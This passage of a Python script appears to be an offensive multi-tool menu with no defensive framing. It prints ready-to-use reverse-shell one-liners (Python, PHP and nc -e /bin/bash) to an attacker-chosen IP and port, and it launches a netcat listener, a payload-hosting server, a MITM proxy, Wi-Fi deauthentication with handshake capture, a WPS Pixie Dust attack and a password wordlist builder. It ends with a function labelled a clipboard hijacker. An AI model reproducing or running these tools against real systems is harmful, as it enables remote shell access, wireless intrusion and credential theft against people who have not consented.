        print(f"Python : python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'")
        print(f"PHP    : php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
        print(f"NC     : nc -e /bin/bash {ip} {port}")
    elif choice == "2":
        port = input("Enter port to listen on: ").strip()
        print(f"[+] Starting Netcat listener on port {port}...")
        os.system(f"x-terminal-emulator -e 'nc -lvnp {port}'")
    else:
        print("[!] Invalid option.")


# === TOOL: Exploit DB Scanner ===

def exploit_db_scanner():
    print("\n[+] Exploit DB Scanner (SearchSploit + CVE Lookup)")
    print("1) Search by software/service")
    print("2) Search by CVE ID")
    choice = input("Select option: ").strip()

    if choice == "1":
        query = input("Enter software or service name: ").strip()
        print(f"\n[✓] Searching Exploit-DB for '{query}'...")
        os.system(f"searchsploit {query}")
    elif choice == "2":
        cve = input("Enter CVE ID (e.g. CVE-2021-3156): ").strip()
        print(f"\n[✓] Searching Exploit-DB for '{cve}'...")
        os.system(f"searchsploit {cve}")
    else:
        print("[!] Invalid selection.")


# === TOOL: Payload Dropper ===

def payload_dropper():
    print("\n[+] Payload Dropper (Simple HTTP File Host)")
    port = input("Enter port to host on (default 8000): ").strip() or "8000"
    directory = input("Enter directory to serve (default current): ").strip() or "."

    print(f"[✓] Hosting files from '{directory}' at http://0.0.0.0:{port}/")
    print("[*] Press CTRL+C to stop the server.")

    os.chdir(directory)
    os.system(f"python3 -m http.server {port}")


# === TOOL: MITM Proxy (HTTP Interception) ===

def mitm_proxy():
    print("\n[+] Launching MITM Proxy (mitmproxy required)")
    print("[*] Intercepting HTTP traffic on port 8080")
    print("[*] Use browser/device with proxy settings pointing to this machine:8080")
    print("[!] Press Q in terminal to quit mitmproxy")

    os.system("x-terminal-emulator -e 'mitmproxy -p 8080'")


# === TOOL: IP Geolocation ===

def ip_geolocation():
    import requests
    print("\n[+] IP Geolocation Tool")
    target_ip = input("Enter IP or domain: ").strip()
    if not target_ip:
        print("[!] No input provided.")
        return
    try:
        response = requests.get(f"https://ipinfo.io/{target_ip}/json")
        if response.status_code == 200:
            data = response.json()
            print("[✓] Geolocation Info:")
            for key, value in data.items():
                print(f"   {key.title()}: {value}")
        else:
            print("[!] Failed to retrieve info. Check IP/domain.")
    except Exception as e:
        print(f"[!] Error: {e}")


# === TOOL: Port Forwarding Manager ===

def port_forwarding_manager():
    import os
    print("\n[+] Port Forwarding Manager")
    print("1. View Rules")
    print("2. Add Forwarding Rule")
    print("3. Delete Rule")
    choice = input("Select option: ").strip()

    if choice == "1":
        os.system("iptables -t nat -L --line-numbers")
    elif choice == "2":
        in_port = input("Incoming Port: ").strip()
        forward_ip = input("Forward To IP: ").strip()
        forward_port = input("Forward To Port: ").strip()
        os.system(f"iptables -t nat -A PREROUTING -p tcp --dport {in_port} -j DNAT --to-destination {forward_ip}:{forward_port}")
        os.system(f"iptables -A FORWARD -p tcp -d {forward_ip} --dport {forward_port} -j ACCEPT")
        print("[+] Forwarding rule added.")
    elif choice == "3":
        os.system("iptables -t nat -L PREROUTING --line-numbers")
        rule_num = input("Enter rule number to delete from PREROUTING: ").strip()
        os.system(f"iptables -t nat -D PREROUTING {rule_num}")
        print("[+] Rule deleted.")
    else:
        print("[!] Invalid choice.")


# === TOOL: Process Monitor ===

def process_monitor():
    import psutil
    from tabulate import tabulate
    print("\n[+] Running Processes (Top 15 by Memory Use):\n")
    processes = []
    for p in psutil.process_iter(['pid', 'name', 'username', 'memory_percent']):
        try:
            processes.append(p.info)
        except psutil.NoSuchProcess:
            continue
    sorted_proc = sorted(processes, key=lambda x: x['memory_percent'], reverse=True)[:15]
    print(tabulate(sorted_proc, headers='keys', tablefmt='fancy_grid'))


# === TOOL: Wi-Fi Cracker (Handshake Capture) ===

def wifi_cracker():
    import os
    print("\n[+] Wi-Fi Cracker: Handshake Capture Tool")
    iface = input("Wireless interface (must support monitor mode): ").strip()
    bssid = input("Target BSSID: ").strip()
    channel = input("Channel: ").strip()
    output = input("Output file (e.g. handshake.cap): ").strip()

    os.system(f"airmon-ng start {iface}")
    mon_iface = iface + "mon"
    print(f"[+] Monitor mode enabled on {mon_iface}")

    print("[*] Starting airodump-ng to capture handshakes...")
    print("[!] You will need to manually CTRL+C once handshake is captured.")
    os.system(f"airodump-ng -c {channel} --bssid {bssid} -w {output} {mon_iface}")

    print("[*] Sending deauth packets to force handshake...")
    os.system(f"aireplay-ng --deauth 10 -a {bssid} {mon_iface}")

    print("[✓] Capture process complete. Check your .cap file.")
    os.system(f"airmon-ng stop {mon_iface}")


# === TOOL: WPS Pixie Dust Attack ===

def wps_pixie_attack():
    import os
    print("\n[+] WPS Pixie Dust Attack Tool")
    iface = input("Wireless interface (must support monitor mode): ").strip()
    bssid = input("Target BSSID (AP MAC): ").strip()
    channel = input("Channel: ").strip()

    os.system(f"airmon-ng start {iface}")
    mon_iface = iface + "mon"
    print(f"[+] Monitor mode enabled on {mon_iface}")

    print("[*] Launching Reaver Pixie Dust attack (press CTRL+C to stop)...")
    os.system(f"reaver -i {mon_iface} -b {bssid} -c {channel} -K -vv")

    print("[✓] Attack finished (check for recovered WPS PIN or PSK).")
    os.system(f"airmon-ng stop {mon_iface}")


# === TOOL: Hash Identifier ===

def hash_identifier():
    import re
    print("\n[+] Hash Identifier")
    h = input("Enter hash to identify: ").strip()

    patterns = {
        "MD5": r"^[a-f0-9]{32}$",
        "SHA-1": r"^[a-f0-9]{40}$",
        "SHA-256": r"^[a-f0-9]{64}$",
        "SHA-512": r"^[a-f0-9]{128}$",
        "NTLM": r"^[a-f0-9]{32}$",
        "MySQL5": r"^\*[A-F0-9]{40}$",
        "bcrypt": r"^\$2[aby]?\$\d{2}\$[./A-Za-z0-9]{53}$",
    }

    found = []
    for name, pattern in patterns.items():
        if re.fullmatch(pattern, h, re.IGNORECASE):
            found.append(name)

    if found:
        print(f"[✓] Possible types: {', '.join(found)}")
    else:
        print("[x] No match found. Try hashid or hash-identifier for more.")


# === TOOL: Base64 Encoder/Decoder ===

def base64_tool():
    import base64
    print("\n[+] Base64 Tool")
    mode = input("Encode or Decode? (e/d): ").strip().lower()
    if mode == "e":
        data = input("Enter text to encode: ").strip()
        encoded = base64.b64encode(data.encode()).decode()
        print(f"[✓] Encoded: {encoded}")
    elif mode == "d":
        data = input("Enter base64 to decode: ").strip()
        try:
            decoded = base64.b64decode(data).decode()
            print(f"[✓] Decoded: {decoded}")
        except:
            print("[x] Invalid Base64 input.")
    else:
        print("[x] Invalid option.")


# === TOOL: Bluetooth Scanner ===

def bluetooth_scan():
    import bluetooth
    print("\n[+] Scanning for Bluetooth devices...")
    devices = bluetooth.discover_devices(duration=8, lookup_names=True)
    if devices:
        for addr, name in devices:
            print(f"[*] {name} - {addr}")
    else:
        print("[x] No Bluetooth devices found.")


# === TOOL: Wordlist Builder ===

def wordlist_builder():
    print("\n[+] Wordlist Builder")
    base = input("Enter base word (e.g., password): ").strip()
    use_numbers = input("Add numbers? (y/n): ").strip().lower() == "y"
    use_symbols = input("Add symbols? (y/n): ").strip().lower() == "y"
    filename = input("Output filename: ").strip() or "wordlist.txt"
    numbers = ["123", "2024", "007", "1", "321"] if use_numbers else [""]
    symbols = ["!", "@", "#", "$"] if use_symbols else [""]

    combos = []
    for n in numbers:
        for s in symbols:
            combos.append(base + n + s)
            combos.append(s + base + n)
            combos.append(n + base + s)

    with open(filename, "w") as f:
        for word in combos:
            f.write(word + "\n")

    print(f"[✓] Wordlist saved to {filename}")


# === TOOL: PDF Metadata Extractor ===

def pdf_metadata_extractor():
    from PyPDF2 import PdfReader
    path = input("Enter path to PDF file: ").strip()
    if not os.path.isfile(path):
        print("[x] File not found.")
        return
    try:
        reader = PdfReader(path)
        info = reader.metadata
        print(f"[+] Metadata for {path}:")
        for key, value in info.items():
            print(f"    {key}: {value}")
    except Exception as e:
        print(f"[!] Error reading PDF: {e}")


# === TOOL: USB Device Logger ===

def usb_device_logger():
    print("\n[+] Listing connected USB devices...")
    output = subprocess.getoutput("lsusb")
    print(output)
    save = input("Save output to file? (y/n): ").strip().lower()
    if save == "y":
        with open("usb_devices.log", "w") as f:
            f.write(output)
        print("[✓] Output saved to usb_devices.log")


# === TOOL: Subdomain Finder ===

def subdomain_finder():
    import requests
    from bs4 import BeautifulSoup
    target = input("Enter domain (e.g. example.com): ").strip()
    print(f"[+] Searching for subdomains of {target} using crt.sh...")
    try:
        url = f"https://crt.sh/?q=%25.{target}&output=json"
        r = requests.get(url, timeout=10)
        if r.status_code != 200:
            print("[x] Failed to retrieve data.")
            return
        data = r.json()
        subdomains = sorted(set(entry['name_value'] for entry in data))
        for sub in subdomains:
            print(" -", sub)
        save = input("Save to file? (y/n): ").strip().lower()
        if save == "y":
            with open(f"{target}_subdomains.txt", "w") as f:
                for sub in subdomains:
                    f.write(sub + "\n")
            print(f"[✓] Saved to {target}_subdomains.txt")
    except Exception as e:
        print(f"[!] Error: {e}")


# === TOOL: Screenshot Capturer ===

def screenshot_capturer():
    try:
        from PIL import ImageGrab
    except ImportError:
        print("[!] PIL module not found. Install with: pip install pillow")
        return
    import datetime
    filename = f"screenshot_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
    try:
        img = ImageGrab.grab()
        img.save(filename)
        print(f"[✓] Screenshot saved as {filename}")
    except Exception as e:
        print(f"[x] Failed to take screenshot: {e}")


# === TOOL: PDF Metadata Extractor ===

def pdf_metadata_extractor():
    from PyPDF2 import PdfReader
    path = input("Enter path to PDF file: ").strip()
    if not os.path.isfile(path):
        print("[x] File does not exist.")
        return
    try:
        reader = PdfReader(path)
        meta = reader.metadata
        if not meta:
            print("[!] No metadata found.")
            return
        print("[✓] PDF Metadata:")
        for key, value in meta.items():
            print(f" - {key}: {value}")
    except Exception as e:
        print(f"[x] Error reading PDF: {e}")


# === TOOL: Hidden File Finder ===

def hidden_file_finder():
    path = input("Enter directory to scan for hidden files: ").strip()
    if not os.path.isdir(path):
        print("[x] Directory does not exist.")
        return
    print(f"[✓] Scanning '{path}' for hidden files...")
    found = False
    for root, dirs, files in os.walk(path):
        for name in files + dirs:
            if name.startswith("."):
                print(f" - {os.path.join(root, name)}")
                found = True
    if not found:
        print("[✓] No hidden files found.")


# === TOOL: Clipboard Hijacker ===

import pyperclip

def clipboard_hijacker():
    print("[*] Monitoring clipboard... (Press Ctrl+C to stop)")
    old_clipboard = ""
    try:
        while True:
            content = pyperclip.paste()
            if content != old_clipboard:
                print(f"[CLIPBOARD] {content}")
                old_clipboard = content
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[x] Stopped clipboard monitoring.")


